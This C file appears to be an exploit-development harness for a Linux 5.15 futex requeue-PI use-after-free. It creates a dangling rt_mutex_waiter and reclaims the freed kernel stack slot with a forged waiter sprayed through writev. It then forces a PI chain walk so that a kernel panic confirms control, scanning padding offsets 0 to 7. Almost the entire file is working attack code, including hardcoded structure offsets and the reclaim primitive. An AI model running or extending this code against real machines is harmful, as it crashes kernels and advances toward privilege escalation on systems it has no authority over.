/* reclaim_harness.c — EXPERIMENTAL harness (research front).
 *
 * After obtaining -EDEADLK (dangling W->pi_blocked_on) we try to reclaim
 * the freed W_rt_waiter frame with controlled bytes (writev iovstack),
 * inserting a crafted rt_mutex_waiter, and we force a PI chain walk
 * (FUTEX_LOCK_PI via M). If the walk uses the crafted structure with an
 * invalid `lock`, we get a fault (panic) = CONFIRMATION that the UAF is
 * controllable. We scan the pattern position within iovstack (pad 0..7).
 *
 * NOTE: this is NOT an exploit yet. It is a UAF observability test.
 * Panic = success of this test (a reboot suffices). Run manually, once.
 *
 * Build:
 *   $CC -O1 -static -pie -fPIE -o reclaim_harness reclaim_harness.c -pthread
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <stdlib.h>

#define SYS_FUTEX       98
#define SYS_PSELECT6    72
#define SYS_WRITEV      66
#define FUTEX_LOCK_PI   6
#define FUTEX_UNLOCK_PI 7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG 128
#define FLPI (FUTEX_LOCK_PI|FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI|FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI|FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI|FUTEX_PRIVATE_FLAG)

/* offsets in rt_mutex_waiter (5.15.185) */
#define W_TREE 0x00
#define W_PI_TREE 0x18
#define W_TASK 0x30
#define W_LOCK 0x38
#define W_WAKE 0x40
#define W_PRIO 0x44
#define W_WWCTX 0x50
#define W_SIZE 0x58

static uint32_t futex1, futex2, cycle_futex;
static volatile int o_ready, w_ready, o_blocking, w_waiting, reclaim_done, probe_go;
static int g_pad = 0;
static int g_variant = 0;

static long xfutex(uint32_t *u,int op,uint32_t v,void *ts,uint32_t *u2,uint32_t v3)
{ return syscall(SYS_FUTEX,u,op,v,ts,u2,v3); }
static void P(const char*s){ write(2,s,strlen(s)); }

/* Builds a forged rt_mutex_waiter in the buffer byte by byte. */
static void build_fake(uint8_t *w)
{
    memset(w, 0, W_SIZE);
    /* we leave tree_entry/pi_tree_entry as 0 (rb_* will set them at runtime) */
    *(uint64_t*)(w+W_TASK)   = 0x4141414141414141UL; /* task */
    *(uint64_t*)(w+W_LOCK)   = 0xdead0000dead0000UL; /* lock -> fault on deref */
    *(uint32_t*)(w+W_WAKE)   = 0;
    *(uint32_t*)(w+W_PRIO)   = 1;                    /* low prio */
    *(uint64_t*)(w+W_WWCTX)  = 0;
}

/* Reclaim: writev(-1, iov, 8) -> iovstack[8] (128 B) on W's kernel stack.
 * We place the forged waiter pattern shifted by g_pad iovecs. */
static void do_reclaim(void)
{
    struct iovec iov[8];
    uint8_t buf[W_SIZE + 128];
    memset(buf, 0, sizeof(buf));
    build_fake(buf);
    for (int i = 0; i < 8; i++) {
        (void)i;
        iov[i].iov_base = (void *)buf;
        iov[i].iov_len  = 0;                 /* irrelevant; iovstack contents matter */
    }
    /* Overwrite part of iovstack so it contains the pattern (iov = u64 pairs). */
    uint64_t *raw = (uint64_t *)iov;
    uint64_t *pat = (uint64_t *)buf;
    int words = (W_SIZE + 7) / 8;
    int start = g_pad * 2;                   /* 1 iovec = 2 u64 */
    for (int i = 0; i < words && (start + i) < 16; i++)
        raw[start + i] = pat[i];

    syscall(SYS_WRITEV, -1, iov, 8);         /* copies iovstack onto the kernel stack */
}

static void *owner_fn(void *x){ (void)x;
    pid_t tid=(pid_t)syscall(SYS_gettid);
    __atomic_store_n(&futex2,(uint32_t)tid,__ATOMIC_RELEASE);
    __atomic_store_n(&o_ready,1,__ATOMIC_RELEASE);
    while(!__atomic_load_n(&w_ready,__ATOMIC_ACQUIRE)) sched_yield();
    __atomic_store_n(&o_blocking,1,__ATOMIC_RELEASE);
    xfutex(&cycle_futex,FLPI,0,NULL,NULL,0);
    xfutex(&cycle_futex,FUPI,0,NULL,NULL,0);
    return NULL;
}

static void *waiter_fn(void *x){ (void)x;
    pid_t tid=(pid_t)syscall(SYS_gettid);
    struct timespec ts;
    while(!__atomic_load_n(&o_ready,__ATOMIC_ACQUIRE)) sched_yield();
    __atomic_store_n(&cycle_futex,(uint32_t)tid,__ATOMIC_RELEASE);
    __atomic_store_n(&w_ready,1,__ATOMIC_RELEASE);
    while(!__atomic_load_n(&o_blocking,__ATOMIC_ACQUIRE)) sched_yield();
    usleep(20000);
    __atomic_store_n(&w_waiting,1,__ATOMIC_RELEASE);
    clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_nsec += 300*1000*1000; /* 300 ms */
    if (ts.tv_nsec >= 1000000000) { ts.tv_sec++; ts.tv_nsec -= 1000000000; }
    xfutex(&futex1,FWRQ,0,&ts,&futex2,0);    /* timeout -> frees the rt_waiter frame */
    /* RECLAIM: overwrite the freed slot with the forged waiter */
    do_reclaim();
    /* extra stack "warm-up" (more frames) */
    for (volatile int i=0;i<4;i++) syscall(172 /*getpid*/);
    __atomic_store_n(&reclaim_done,1,__ATOMIC_RELEASE);
    while(!__atomic_load_n(&probe_go,__ATOMIC_ACQUIRE)) sched_yield();
    usleep(300000);
    xfutex(&cycle_futex,FUPI,0,NULL,NULL,0);
    return NULL;
}

int main(int argc,char**argv){
    int pad0=0, pad1=7;
    if (argc>=2) pad0=pad1=atoi(argv[1]);
    else if (argc>=3){ pad0=atoi(argv[1]); pad1=atoi(argv[2]); }
    setvbuf(stderr,NULL,_IONBF,0);
    P("[*] reclaim harness (eksperymentalny)\n");
    for (g_pad=pad0; g_pad<=pad1; g_pad++) {
        char m[96]; int n=snprintf(m,sizeof(m),"\n=== pad=%d ===\n",g_pad); write(2,m,n);
        o_ready=w_ready=o_blocking=w_waiting=reclaim_done=probe_go=0;
        futex1=futex2=cycle_futex=0;
        pthread_t o,w;
        pthread_create(&o,NULL,owner_fn,NULL);
        pthread_create(&w,NULL,waiter_fn,NULL);
        while(!__atomic_load_n(&w_waiting,__ATOMIC_ACQUIRE)) sched_yield();
        usleep(40000);
        P("[M] CMP_REQUEUE_PI\n");
        long r=xfutex(&futex1,FCRQ,1,(void*)(uintptr_t)1,&futex2,0); int e=errno;
        { char b[80]; int k=snprintf(b,sizeof(b),"[M] ret=%ld errno=%d\n",r,e); write(2,b,k); }
        /* wait for W's reclaim (after its timeout), then walk */
        while(!__atomic_load_n(&reclaim_done,__ATOMIC_ACQUIRE)) sched_yield();
        P("[M] UAF probe LOCK_PI(cycle_futex) -- jesli pad=OK -> PANIC=potwierdzenie\n");
        __atomic_store_n(&probe_go,1,__ATOMIC_RELEASE);
        xfutex(&cycle_futex,FLPI,0,NULL,NULL,0);
        P("[M] probe returned (this pad did NOT hit)\n");
        xfutex(&cycle_futex,FUPI,0,NULL,NULL,0);
        pthread_join(w,NULL); pthread_join(o,NULL);
    }
    P("[*] koniec skanu\n");
    return 0;
}
